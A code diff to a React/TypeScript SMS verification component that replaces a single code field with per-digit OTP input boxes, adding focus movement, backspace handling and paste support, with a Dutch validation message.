@@ -140,6 +140,40 @@ export function SmsClient({ sessionId }: Props) {
   const valid = trimmed.length === digits && /^\d+$/.test(trimmed);
   const displayText = customText || settings.sms_subtitle;
 
+  // OTP style input handling
+  const handleOtpChange = (index: number, value: string) => {
+    if (!/^\d*$/.test(value)) return;
+    
+    const newCode = code.split("");
+    newCode[index] = value.substring(value.length - 1); // Only take the last char
+    const updatedCode = newCode.join("");
+    setCode(updatedCode.slice(0, digits));
+
+    // Move to next input
+    if (value && index < digits - 1) {
+      const nextInput = document.getElementById(`otp-input-${index + 1}`);
+      if (nextInput) nextInput.focus();
+    }
+  };
+
+  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace" && !code[index] && index > 0) {
+      const prevInput = document.getElementById(`otp-input-${index - 1}`);
+      if (prevInput) prevInput.focus();
+    }
+  };
+
+  const handlePaste = (e: React.ClipboardEvent) => {
+    e.preventDefault();
+    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, digits);
+    setCode(pastedData);
+    if (pastedData.length > 0) {
+      const focusIndex = Math.min(pastedData.length, digits - 1);
+      const input = document.getElementById(`otp-input-${focusIndex}`);
+      if (input) input.focus();
+    }
+  };
+
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
       <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
@@ -160,18 +194,25 @@ export function SmsClient({ sessionId }: Props) {
         </div>
         
         <form onSubmit={handleSubmit} className="space-y-5">
-          <label className="block text-sm font-medium text-white">
-            {settings.sms_input_label} ({digits})
-            <input
-              required
-              inputMode="numeric"
-              autoComplete="one-time-code"
-              maxLength={digits}
-              className="mt-2 block w-full rounded-xl border border-transparent bg-white/10 py-3 px-4 text-xl tracking-[0.35em] text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
-              value={code}
-              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, digits))}
-            />
-          </label>
+          <div className="block text-sm font-medium text-white">
+            <div className="mb-3">{settings.sms_input_label} ({digits})</div>
+            <div className="flex gap-2 justify-center" onPaste={handlePaste}>
+              {Array.from({ length: digits }).map((_, index) => (
+                <input
+                  key={index}
+                  id={`otp-input-${index}`}
+                  required
+                  inputMode="numeric"
+                  autoComplete="one-time-code"
+                  maxLength={1}
+                  className="w-12 h-14 sm:w-14 sm:h-16 text-center rounded-xl border border-transparent bg-white/10 text-2xl sm:text-3xl font-bold text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
+                  value={code[index] || ""}
+                  onChange={(e) => handleOtpChange(index, e.target.value)}
+                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
+                />
+              ))}
+            </div>
+          </div>
 
           {!valid && code.length > 0 ? (
             <p className="text-xs text-red-400">Voer exact {digits} cijfers in.</p>
